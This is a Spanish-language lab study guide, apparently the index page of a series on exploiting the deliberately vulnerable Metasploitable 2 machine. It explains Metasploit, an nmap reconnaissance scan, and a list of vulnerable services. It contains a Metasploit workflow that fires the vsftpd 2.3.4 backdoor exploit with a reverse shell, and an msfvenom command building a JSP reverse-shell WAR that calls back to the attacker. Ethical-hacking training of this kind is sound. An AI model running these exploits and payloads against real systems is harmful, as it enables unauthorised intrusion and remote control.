# Reconocimiento y Metasploit — Metasploitable 2

> **Documento de estudio para laboratorio.** Metasploitable 2 es una máquina virtual creada a propósito con fallos de seguridad para practicar *hacking ético* de forma legal. Todo lo que aquí se describe debe hacerse **únicamente** sobre tu propia máquina de laboratorio, aislada de Internet. Atacar sistemas de terceros sin autorización expresa y por escrito es un delito.

Esta es la entrada a una serie de apuntes dedicados a explotar, servicio a servicio, la máquina [Metasploitable 2](./00_instalacion.md) ya instalada en el laboratorio. Aquí se recoge el entorno de referencia, una introducción a Metasploit Framework y el reconocimiento inicial con Nmap; cada servicio se trata después en su propio documento.

## Índice

1. [Entorno y convenciones](#1-entorno-y-convenciones)
2. [¿Qué es Metasploit y cómo se usa?](#2-qué-es-metasploit-y-cómo-se-usa)
3. [Reconocimiento inicial (nmap)](#3-reconocimiento-inicial-nmap)
4. [Documentos de explotación por servicio](#4-documentos-de-explotación-por-servicio)

---

## 1. Entorno y convenciones

| Elemento | Descripción |
|---|---|
| **Atacante** | Kali Linux, con todas las herramientas ya instaladas (`nmap`, Metasploit, `smbclient`, `hydra`, etc.). |
| **Objetivo** | Metasploitable 2 (máquina Debian intencionadamente vulnerable). |
| **Red** | Las dos máquinas en la misma red local **aislada** (red interna o solo-anfitrión del hipervisor). |

A lo largo de toda esta serie de apuntes se usan las siguientes direcciones IP fijas del laboratorio:

| Marcador | IP | Máquina |
|---|---|---|
| `<ATTACKER>` | **`192.168.100.8`** | Kali Linux |
| `<TARGET>` | **`192.168.100.9`** | Metasploitable 2 |

> **Nota:** Si tu laboratorio usa otro rango de direcciones, basta con sustituir estas dos IPs por las tuyas en todos los comandos de la serie.

Para localizar la IP del objetivo en tu red (si no la conocieras de antemano):

```bash
# Barrido de la red local para descubrir hosts activos
sudo nmap -sn 192.168.100.0/24
```

---

## 2. ¿Qué es Metasploit y cómo se usa?

**Metasploit Framework** es la herramienta de *pentesting* más conocida, desarrollada por Rapid7. Es, en esencia, una enorme **colección de exploits, payloads y utilidades** ya preparados, más un motor que los ejecuta y gestiona las conexiones con las máquinas comprometidas. En lugar de programar cada ataque a mano, seleccionas un módulo, lo configuras con unos pocos datos y lo lanzas.

### Conceptos clave

| Término | Qué es |
|---|---|
| **msfconsole** | La consola interactiva desde la que se maneja todo Metasploit. |
| **Módulo** | Cada herramienta concreta. Tipos principales: `exploit` (aprovecha una vulnerabilidad), `payload` (el código que se ejecuta en la víctima), `auxiliary` (escáneres, fuzzers, logins), `post` (acciones tras entrar) y `encoder`/`nop` (ofuscación). |
| **Payload** | La "carga" que se ejecuta al entrar. Puede ser una *shell* simple o **Meterpreter** (una shell avanzada con muchas funciones). |
| **Shell inversa (reverse)** | La víctima se conecta *de vuelta* al atacante. Requiere `LHOST` (IP de Kali) y `LPORT` (puerto donde Kali escucha). |
| **Shell directa (bind)** | El atacante se conecta a un puerto que abre la víctima. Requiere `RHOST`/`RPORT`. |
| **RHOSTS / RPORT** | IP y puerto del objetivo (la "R" es de *remote*). |
| **Sesión** | Cada acceso conseguido. Se listan con `sessions -l` y se entra con `sessions -i <id>`. |

### Flujo de trabajo básico

```bash
# 1. Arrancar la consola
msfconsole

# 2. Buscar un módulo
msf6 > search vsftpd

# 3. Seleccionarlo
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 4. Ver qué opciones necesita
msf6 exploit(...) > show options

# 5. Configurar las opciones imprescindibles
msf6 exploit(...) > set RHOSTS 192.168.100.9
msf6 exploit(...) > set LHOST 192.168.100.8     # solo si el payload es una reverse shell

# 6. (Opcional) elegir payload
msf6 exploit(...) > set PAYLOAD cmd/unix/reverse

# 7. Lanzar el ataque
msf6 exploit(...) > exploit      # también vale 'run'
```

Comandos útiles dentro de msfconsole: `info` (detalles del módulo), `show payloads` (payloads compatibles), `back` (salir del módulo), `sessions` (gestionar accesos), `background` (dejar una sesión en segundo plano).

> **Generar payloads a mano:** la utilidad `msfvenom` crea payloads en distintos formatos (por ejemplo un `.war` para Tomcat o un ejecutable), muy útil cuando explotas *sin* el motor de exploits pero quieres la potencia de un payload de Metasploit. Ejemplo:
> ```bash
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.100.8 LPORT=4444 -f war -o shell.war
> ```

---

## 3. Reconocimiento inicial (nmap)

Antes de explotar nada hay que saber **qué servicios** expone la máquina y **qué versión** tienen, porque casi todas las vulnerabilidades dependen de la versión concreta. La herramienta estándar es `nmap`.

```bash
# -sV: identifica servicio y versión | -p-: los 65535 puertos | -sC: scripts básicos
sudo nmap -sV -sC -p- 192.168.100.9 -oN metasploitable2.txt
```

Puertos abiertos típicos de Metasploitable 2 y a qué servicio corresponden:

| Puerto | Servicio | Versión aproximada |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 |
| 23 | Telnet | Linux telnetd |
| 25 | SMTP | Postfix |
| 53 | DNS | ISC BIND 9.4.2 |
| 80 | HTTP | Apache 2.2.8 (PHP 5.2.4) |
| 111 | rpcbind | 2 (RPC) |
| 139 / 445 | SMB | Samba 3.0.20 |
| 512 / 513 / 514 | exec / login / shell | servicios "r" (rexec, rlogin, rsh) |
| 1099 | Java RMI | GNU Classpath rmiregistry |
| 1524 | ingreslock | **bindshell** (puerta trasera) |
| 2049 | NFS | NFS 2–4 |
| 2121 | FTP | ProFTPD 1.3.1 |
| 3306 | MySQL | 5.0.51a |
| 3632 | distccd | distcc v1 |
| 5432 | PostgreSQL | 8.3.0–8.3.7 |
| 5900 | VNC | VNC (protocolo 3.3) |
| 6000 | X11 | X server (sin autenticación) |
| 6667 | IRC | UnrealIRCd 3.2.8.1 |
| 8009 / 8180 | Tomcat | Apache Tomcat/Coyote 1.1 |
| 8787 | DRb | Ruby distribuido (drb) |

> Los puertos 6697, 8787 y varios puertos altos (39292, 43729, 44813, 55852…) corresponden a servicios RPC dinámicos (mountd de NFS) y al IRC/DRb. Los relevantes para explotar están en la tabla.

---

## 4. Documentos de explotación por servicio

Cada servicio se trata en su propio documento, con la misma estructura: **(a)** qué es y qué hace · **(b)** cómo se explota · **(c)** explotación **manual** (sin Metasploit) · **(d)** explotación **con Metasploit**.

| # | Servicio | Puerto(s) | Documento |
|---|---|---|---|
| 1 | FTP — vsftpd 2.3.4 | 21 | [02_ftp.md](./02_ftp.md) |
| 2 | SSH — OpenSSH 4.7p1 | 22 | [03_ssh.md](./03_ssh.md) |
| 3 | Telnet | 23 | [04_telnet.md](./04_telnet.md) |
| 4 | SMTP — Postfix | 25 | [05_smtp.md](./05_smtp.md) |
| 5 | DNS — BIND 9.4.2 | 53 | [06_dns.md](./06_dns.md) |
| 6 | HTTP — Apache + aplicaciones web | 80 | [07_http.md](./07_http.md) |
| 7 | rpcbind | 111 | [08_rpcbind.md](./08_rpcbind.md) |
| 8 | Samba — SMB 3.0.20 | 139 / 445 | [09_samba.md](./09_samba.md) |
| 9 | Servicios r: exec, login, shell | 512 / 513 / 514 | [10_servicios_r.md](./10_servicios_r.md) |
| 10 | Java RMI | 1099 | [11_java_rmi.md](./11_java_rmi.md) |
| 11 | ingreslock — bindshell | 1524 | [12_ingreslock.md](./12_ingreslock.md) |
| 12 | NFS | 2049 | [13_nfs.md](./13_nfs.md) |
| 13 | ProFTPD 1.3.1 | 2121 | [14_proftpd.md](./14_proftpd.md) |
| 14 | MySQL 5.0.51a | 3306 | [15_mysql.md](./15_mysql.md) |
| 15 | distccd | 3632 | [16_distccd.md](./16_distccd.md) |
| 16 | PostgreSQL 8.3 | 5432 | [17_postgresql.md](./17_postgresql.md) |
| 17 | VNC | 5900 | [18_vnc.md](./18_vnc.md) |
| 18 | X11 | 6000 | [19_x11.md](./19_x11.md) |
| 19 | UnrealIRCd | 6667 | [20_unrealircd.md](./20_unrealircd.md) |
| 20 | Apache Tomcat / Coyote | 8180 | [21_tomcat.md](./21_tomcat.md) |
| 21 | DRb — Ruby distribuido | 8787 | [22_drb.md](./22_drb.md) |

Al terminar con los servicios, conviene revisar también:

- [23_post_explotacion.md](./23_post_explotacion.md) — credenciales débiles y *cracking* de hashes.
- [24_contramedidas.md](./24_contramedidas.md) — resumen de contramedidas para cada fallo visto.
